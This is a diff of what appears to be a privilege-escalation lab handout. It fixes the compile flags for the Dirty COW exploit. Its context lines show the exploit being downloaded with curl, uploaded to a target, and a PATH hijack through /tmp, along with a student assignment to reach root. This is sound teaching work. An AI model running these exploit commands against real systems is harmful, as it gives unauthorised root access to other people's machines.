@@ -222,7 +222,7 @@ curl -O https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
 2. Compile the exploit:
 
 ```bash
-gcc dirty.c -o dirty -pthread
+gcc dirty.c -o dirty -pthread -lcrypt
 ```
 
 3. **Upload the exploit to the target’s **``** directory**:
@@ -378,4 +378,5 @@ export PATH=/tmp:$PATH
   - One step by step Privesc path and root confirmation
   - Step by step attempts at 1 Bonus or Mystery task
 - Submit a 1-paragraph reflection on the escalation path used and what you understand!
+
 
